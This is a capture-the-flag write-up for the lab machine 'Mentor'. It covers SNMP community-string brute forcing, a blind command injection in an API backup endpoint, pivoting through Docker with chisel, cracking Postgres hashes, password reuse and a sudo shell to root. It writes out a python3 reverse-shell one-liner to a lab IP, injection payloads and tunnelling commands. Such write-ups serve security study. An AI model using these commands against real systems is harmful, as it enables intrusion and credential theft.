# Mentor — Medium — Linux

**Date:** 21 - August - 2026

---

## Tags

`#linux` `#web` `#api` `#fastapi` `#vhost-fuzzing` `#snmp` `#community-string` `#command-injection` `#docker` `#chisel` `#pivoting` `#postgresql` `#hash-cracking` `#password-reuse` `#sudo` `#gtfobins` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.228.102 (vhosts: mentorquotes.htb, api.mentorquotes.htb)|
|OS|Ubuntu Linux (host); Docker containers behind it|
|Open ports|22 (SSH), 80 (HTTP), 161/udp (SNMP)|
|Services|OpenSSH 8.9p1 (22); Apache -> Flask/Werkzeug (80); FastAPI on api. vhost; SNMP (161/udp)|
|Foothold|SNMP community-string brute -> `internal` -> leaked password -> API admin -> backup RCE|
|User|container root -> pivot to Postgres -> crack svc hash -> SSH as `svc` -> user.txt|
|Privesc|SNMP config leaks james' password (reuse) -> `sudo /bin/sh` -> root|
|Flags|user.txt as svc (host); root.txt as root (host)|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.228.102
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-25 10:19 +0100
Nmap scan report for 10.129.228.102
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds
```

<img width="852" height="317" alt="image" src="https://github.com/user-attachments/assets/285ac5f4-23e6-4e8e-bc64-2d1a895c5bd3" />

```
nmap -sC -sV -p22,80 10.129.228.102
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux
```

<img width="1204" height="466" alt="image" src="https://github.com/user-attachments/assets/c962f027-4c91-4b5e-8e71-95e9aff726c8" />

```
# after adding mentorquotes.htb to /etc/hosts, the 80 header reveals the app framework
nmap -sC -sV -p22,80 10.129.228.102
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.0.3 Python/3.6.9
```

<img width="1225" height="508" alt="image" src="https://github.com/user-attachments/assets/40e99096-42c6-4bd2-8078-495dfc664121" />

**What each port tells me:**

- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but no credentials yet, so a target to return to once I find some.
- **Port 80 (HTTP)** — Apache redirecting to `mentorquotes.htb`; the app is Python (Werkzeug/Flask on the main site, FastAPI on the api vhost). This is the first surface to work.
- **Port 161/udp (SNMP)** — Not in the initial TCP scan; found later via a UDP scan. Turns out to be the key to the whole foothold (see below).

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH in given valid creds
WHAT I AM GOING TO TRY: Set it aside
WHY: No credentials yet
RESULT: N/A
WHAT NEXT:
- nmap shows a redirect on 80 -> add mentorquotes.htb to /etc/hosts and investigate
- Dir-fuzz for hidden directories
- vhost-fuzz for other subdomains
- Identify the tech stack
```

```
OBSERVATION:
- mentorquotes.htb is a single-page app with little functionality
- Dir-fuzz on the main domain: nothing useful
- vhost-fuzz: api.mentorquotes.htb returns 404 (found only with -mc all; a default fuzz
  filtering for 200s misses it because it answers 404 at the root)
- Nothing notable in the main-domain stack
WHAT IT TELLS ME:
- Add api.mentorquotes.htb to /etc/hosts and enumerate it like the main domain
WHAT I AM GOING TO TRY:
- Investigate the api vhost (dir-fuzz, stack, endpoints)
WHY:
- The main domain is a dead end; the API subdomain is the new lead
RESULT:
- The api root is 404, but dir-fuzz finds /docs -> FastAPI Swagger documentation listing all
  endpoints
- Every useful endpoint requires an "Authorization" header (a JWT). auth/signup lets me
  register a dummy user and get a token, but admin-only endpoints reject it
- One endpoint, /admin/backup, returns 405 (Method Not Allowed) on GET. In Repeater:
  1. GET -> 405
  2. switch to POST -> now reachable, but requires Authorization AND admin -> rejected for my
     dummy user
WHAT NEXT:
- Dead end without admin creds. Before heavier enumeration, do the cheap thing I skipped:
  a UDP scan (SNMP/161 is a classic easy win)
```

<img width="2559" height="1065" alt="image" src="https://github.com/user-attachments/assets/86b374bf-360b-4494-a82a-81a998a15322" />

<img width="2300" height="705" alt="image" src="https://github.com/user-attachments/assets/aa059625-7fe0-43a2-9d27-883211a1b757" />

<img width="1148" height="396" alt="image" src="https://github.com/user-attachments/assets/e952d959-1b7c-4db1-959b-253fe5c24626" />

<img width="1807" height="994" alt="image" src="https://github.com/user-attachments/assets/88d3bfa4-9b08-4a9d-a2ae-421f1f462347" />

<img width="2459" height="1067" alt="image" src="https://github.com/user-attachments/assets/32d3996f-e627-4374-99d8-e1ce6765da3d" />

<img width="1732" height="506" alt="image" src="https://github.com/user-attachments/assets/88ad3bc8-671d-4221-aa02-5be8e7405e18" />

<img width="1569" height="843" alt="image" src="https://github.com/user-attachments/assets/1d2e4498-2571-4d77-88c6-e7ad12253010" />

<img width="2100" height="720" alt="image" src="https://github.com/user-attachments/assets/8145ee6b-9698-4c4a-a974-5ca91c69022d" />

<img width="1654" height="771" alt="image" src="https://github.com/user-attachments/assets/425d05dd-61d8-4c6d-90f9-380056c56888" />

<img width="2105" height="632" alt="image" src="https://github.com/user-attachments/assets/9b65962c-fdf5-4d5c-a9e9-2f3f822afdd8" />

<img width="2101" height="765" alt="image" src="https://github.com/user-attachments/assets/4df57541-b2d3-4306-8f20-908e2571eed6" />

<img width="1470" height="364" alt="image" src="https://github.com/user-attachments/assets/37bc6f2c-a402-4bb4-8147-dd48bf3a5297" />

<img width="2103" height="896" alt="image" src="https://github.com/user-attachments/assets/100174f4-d282-4e51-853f-98d095af20bc" />

```
OBSERVATION:
- UDP scan shows 161/udp (SNMP) open
WHAT IT TELLS ME:
- Enumerate SNMP; it commonly leaks sensitive info (process args, configs, creds)
WHAT I AM GOING TO TRY:
- Enumerate SNMP on 161
WHY:
- SNMP is a well-known information-disclosure surface
RESULT:
- SNMP needs a community string. The default "public" works but shows little; it's SNMP v2
- Because it's v2c, I used snmpbrute.py to brute community strings (v1-only scripts returned
  nothing). It found a second string: "internal"
- Enumerating with community string "internal" dumps process command lines, and one reveals
  what looks like a password (recognisable because it's tied to login.py)
- The API implies a user "james" (james@mentorquotes.htb, the site owner/admin). Using
  james + the SNMP-leaked password against auth/login returned a valid admin JWT
- With the admin token, /admin/backup is now usable and returns "Done!". I tested it for
  command injection with a blind payload ;sleep 5; and the response was delayed ~5s ->
  confirmed BLIND command injection in the backup 'path' field
- Most reverse-shell one-liners failed; a python3 one-liner worked:
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.101",4444));
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
  subprocess.call(["/bin/sh","-i"])'
- The shell is root, but INSIDE a Docker container (not the host). Enumerating /home shows a
  user "svc"; the real user.txt lives on the host, so the container is a pivot point, not the
  finish
WHAT NEXT:
- From container-root, enumerate the container's network and files to pivot toward the host
```

<img width="1177" height="309" alt="image" src="https://github.com/user-attachments/assets/a5dab01f-7754-4aa1-8230-a3b6c743b505" />

<img width="1715" height="486" alt="image" src="https://github.com/user-attachments/assets/d6f35964-1724-4bff-8fd8-247d2a58b3d8" />

<img width="1420" height="195" alt="image" src="https://github.com/user-attachments/assets/41a5d4bc-0151-44b7-b69a-bb3bffd4ff2c" />

<img width="864" height="468" alt="image" src="https://github.com/user-attachments/assets/c123fe66-450d-4288-a48a-8d746cc9c31d" />

<img width="1571" height="235" alt="image" src="https://github.com/user-attachments/assets/8423d33b-4961-4acf-83f1-d73a92a1724f" />

<img width="1418" height="213" alt="image" src="https://github.com/user-attachments/assets/27521281-0f0e-42a1-a961-446930e83d43" />

<img width="628" height="236" alt="image" src="https://github.com/user-attachments/assets/67b31d91-2b66-4cae-ac3f-0b8d72ca9889" />

<img width="2102" height="558" alt="image" src="https://github.com/user-attachments/assets/e112ddeb-daba-45e0-9d76-5dd9d95005b2" />

<img width="2099" height="600" alt="image" src="https://github.com/user-attachments/assets/f1039600-e205-4680-8087-98c13677daf1" />

<img width="2555" height="1120" alt="image" src="https://github.com/user-attachments/assets/3b266c94-e900-46c3-9718-b4dd11cf8db2" />

<img width="372" height="212" alt="image" src="https://github.com/user-attachments/assets/3ab3581f-95fa-4980-a0b7-9f7ac2b8bc2b" />

<img width="2564" height="1113" alt="image" src="https://github.com/user-attachments/assets/7d707264-0611-46a4-8fb8-640ef45b28f3" />

<img width="397" height="189" alt="image" src="https://github.com/user-attachments/assets/43aa2e51-eba7-4c1b-9b40-186e821aa43f" />

<img width="2100" height="706" alt="image" src="https://github.com/user-attachments/assets/07e93ef6-dccc-498c-8bd4-0eeb01d666d5" />

<img width="872" height="373" alt="image" src="https://github.com/user-attachments/assets/81ebba83-e527-4945-8d81-ecffdd226846" />

```
OBSERVATION:
- In /app/app, db.py holds a PostgreSQL connection string: postgres:postgres @ 172.22.0.1
WHAT IT TELLS ME:
- I can reach a PostgreSQL DB on another container (172.22.0.1:5432); it may hold user hashes
WHAT I AM GOING TO TRY:
- Connect to Postgres and dump credentials
WHY:
- DBs commonly store password hashes for the app's users (including svc)
RESULT:
- The container has no psql client, so I pivot with chisel (static build, because the box is
  Alpine). Key detail: the DB host is the container-internal 172.22.0.1, Postgres on 5432
- chisel reverse port-forward brings 172.22.0.1:5432 to my box; then psql connects with
  postgres:postgres
- Dumped the users table and got hashes; cracked svc@mentorquotes.htb's hash on CrackStation
- SSH'd into the HOST as svc with the cracked password -> read user.txt
WHAT NEXT:
- Enumerate as svc for a path to root
```

<img width="1369" height="809" alt="image" src="https://github.com/user-attachments/assets/370bea69-ed8c-4446-a2ee-41c26489e350" />

<img width="615" height="201" alt="image" src="https://github.com/user-attachments/assets/dbc803ef-9794-4d79-9a9d-fd625ba6e1fb" />

<img width="1135" height="251" alt="image" src="https://github.com/user-attachments/assets/ebd37b73-6b50-4893-b54f-192cb7a7f2b5" />

<img width="1381" height="268" alt="image" src="https://github.com/user-attachments/assets/318c0b0a-1826-445a-be93-bdcf9143e3dc" />

<img width="1690" height="946" alt="image" src="https://github.com/user-attachments/assets/86c8c492-ee41-472e-ba8b-37f5ef2fda87" />

<img width="1396" height="580" alt="image" src="https://github.com/user-attachments/assets/39b589a6-1631-49a5-949a-cc09a88e7ca9" />

<img width="1045" height="1145" alt="image" src="https://github.com/user-attachments/assets/8690c032-1791-4890-9024-7f6cac2d0a6b" />

<img width="886" height="324" alt="image" src="https://github.com/user-attachments/assets/188d4c11-69ea-401b-bb07-6c8cd480abda" />


```
OBSERVATION:
- linpeas as svc shows 3 users (james, root, svc), and flags a password in the SNMP config
  files (/etc/snmp/snmpd.conf contains a createUser line with a cleartext password)
WHAT IT TELLS ME:
- Try reusing that SNMP-config password for james and root
WHAT I AM GOING TO TRY:
- Password-reuse the snmpd.conf secret against james and root
WHY:
- Password reuse across accounts/services is common
RESULT:
- The password works for james (su james)
- sudo -l as james: may run /bin/sh as root with NO password
- sudo sh is a direct root shell -> ran sudo sh -> root -> read root.txt

```
<img width="603" height="142" alt="image" src="https://github.com/user-attachments/assets/8504ea2c-dd63-444e-87e4-a705d5269272" />

<img width="1050" height="211" alt="image" src="https://github.com/user-attachments/assets/6dd14ad0-1310-4494-85b9-e2514d0678c6" />

<img width="1782" height="523" alt="image" src="https://github.com/user-attachments/assets/264f9e00-2aa6-46d2-9818-6d62f9bea2a2" />

---

## Foothold

**How I got in:** vhost fuzzing (with `-mc all`, since the api root answers 404) revealed `api.mentorquotes.htb`, whose `/docs` exposed FastAPI Swagger documentation. Every useful endpoint needed an admin JWT, so the API alone was a dead end. A UDP scan then found **SNMP on 161**. The default `public` string leaked little, but brute forcing (snmpbrute.py, since it is SNMP v2c) found a second community string, `internal`, whose walk disclosed a password in a process command line. Using that password with the known admin `james@mentorquotes.htb` produced a valid admin token, unlocking `/admin/backup`, which had a **blind OS command injection** in its `path` field. A python3 reverse-shell payload gave a shell as **root inside a Docker container**.

**Command / exploit used:**

```
# vhost fuzz (match all codes; api answers 404 at root)
ffuf -u http://mentorquotes.htb -H "Host: FUZZ.mentorquotes.htb" -w subdomains.txt -mc all
# -> api.mentorquotes.htb ; /docs = FastAPI Swagger

# UDP -> SNMP, brute the community string, walk with it
sudo nmap -sU -p161 10.129.228.102
python3 snmpbrute.py -t 10.129.228.102              # -> community string: internal
snmpbulkwalk -v2c -c internal 10.129.228.102        # -> leaked password in process args

# get an admin JWT as james, then hit the injectable backup endpoint (blind)
# POST /admin/backup  {"path":"; <cmd> ;"}  with Authorization: Bearer <james JWT>
# blind test:  "path":"; sleep 5 ;"  -> ~5s delay confirms injection
# reverse shell (python3 one-liner worked where bash/nc did not):
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# -> root shell inside a Docker container
```

**Why it worked:** The API's access control was sound (admin-only endpoints rejected my self-registered token), but the credential that unlocked it was sitting in the open: SNMP with a guessable second community string exposed a running process's command line containing a password, and that password belonged to the API's admin `james`. Once authenticated as admin, the `/admin/backup` handler passed its `path` parameter straight into `os.system()` with no sanitisation, so the value became shell input, a classic blind command injection. The injection ran as root, but only within a container, so it is a foothold and pivot rather than the finish.

---

## Privilege Escalation

**Path taken (container root -> svc on host -> james -> root):**

_Pivot + user.txt:_ As container-root, `/app/app/db.py` held a PostgreSQL connection string (`postgres:postgres` @ `172.22.0.1:5432`, another container). The container had no `psql`, so I tunnelled with a **static chisel** build (Alpine) to reach `172.22.0.1:5432`, connected with `psql`, dumped the users table, and cracked **svc**'s hash on CrackStation. Those creds SSH'd into the **host** as `svc` for **user.txt**.

_Root:_ linpeas as svc flagged a cleartext password in `/etc/snmp/snmpd.conf` (a `createUser ... <password>` line). Reused it against the other users: it worked for **james**. `sudo -l` showed james may run `/bin/sh` as root with no password, so `sudo sh` gave a **root** shell and **root.txt**.

**Command / exploit used:**

```
# pivot from the container to the postgres container with a static chisel
# attacker:   ./chisel server -p 9002 --reverse
# container:  ./chisel client <LHOST>:9002 R:5432:172.22.0.1:5432
psql -h 127.0.0.1 -U postgres            # postgres:postgres -> dump users table hashes
# crack svc's hash (CrackStation) -> SSH to the HOST
ssh svc@10.129.228.102                    # -> user.txt

# root: snmpd.conf leaks a password reused by james
cat /etc/snmp/snmpd.conf                   # createUser ... <password>
su james                                   # password reuse
sudo -l                                    # (root) NOPASSWD: /bin/sh
sudo sh                                     # -> root -> root.txt
```

**Why it worked:** Two themes repeat. First, secrets stored in the clear: a DB connection string with default `postgres:postgres` creds in `db.py`, and a plaintext password in `snmpd.conf`. Second, network segmentation that only slowed things down, the Postgres DB was on a separate container, but chisel port-forwarding made it reachable, and the DB held crackable user hashes. The final step is a textbook sudo misconfiguration: `NOPASSWD: /bin/sh` is a direct, documented root shell (GTFOBins), because sh run as root simply drops you into a root prompt.

---

## Post-Box Debrief

### Command quick-reference

```
# vhost + API
ffuf -u http://mentorquotes.htb -H "Host: FUZZ.mentorquotes.htb" -w subdomains.txt -mc all
# browse http://api.mentorquotes.htb/docs (FastAPI Swagger)

# SNMP
sudo nmap -sU -p161 <ip>
python3 snmpbrute.py -t <ip>                      # -> community: internal
snmpbulkwalk -v2c -c internal <ip>                # -> leaked password

# admin JWT (james + snmp password) -> blind cmdi in /admin/backup path field
# "path":"; sleep 5 ;"  (timing test) then python3 revshell one-liner

# pivot to postgres container and dump hashes
./chisel server -p 9002 --reverse                 # attacker
./chisel client <LHOST>:9002 R:5432:172.22.0.1:5432   # container (static build on Alpine)
psql -h 127.0.0.1 -U postgres                     # postgres:postgres

# host access + root
ssh svc@<ip>                                       # cracked svc hash
cat /etc/snmp/snmpd.conf ; su james ; sudo sh      # password reuse -> NOPASSWD /bin/sh
```

### Reflection

1. **Foothold technique in one sentence:** Brute forced a second SNMP community string (`internal`) to leak an admin password, used it to get a FastAPI admin JWT, and exploited a blind `os.system` command injection in `/admin/backup` for a shell as root inside a Docker container.
2. **Privesc technique in one sentence:** Pivoted with chisel to a Postgres container, cracked svc's hash for SSH to the host, then reused a plaintext password from `snmpd.conf` to become james and ran `sudo /bin/sh` to root.
